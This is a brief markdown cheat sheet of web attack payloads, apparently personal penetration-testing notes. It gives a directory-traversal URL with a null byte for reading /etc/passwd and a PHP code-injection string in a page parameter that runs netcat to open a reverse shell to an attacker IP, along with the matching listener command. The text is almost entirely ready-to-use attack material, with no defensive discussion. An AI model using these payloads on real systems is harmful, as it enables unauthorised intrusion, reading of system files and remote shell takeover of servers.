## Hacks for in the browser

To attempt to view the /etc/passwd file </b>
`http://host/index.php?page=./../../../../../etc/passwd%00`
---
# Obtaining Shell through Browser Bar (PHP)
```
# If you get similar to ?page=index in the browser bar
# In your attacking machine
nc -nlvp 441

# In the browser bar. Replace 10.11.1.139 with your attacking IP.
http://thedomain.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%2010.11.1.139%20441%27)};%23
```
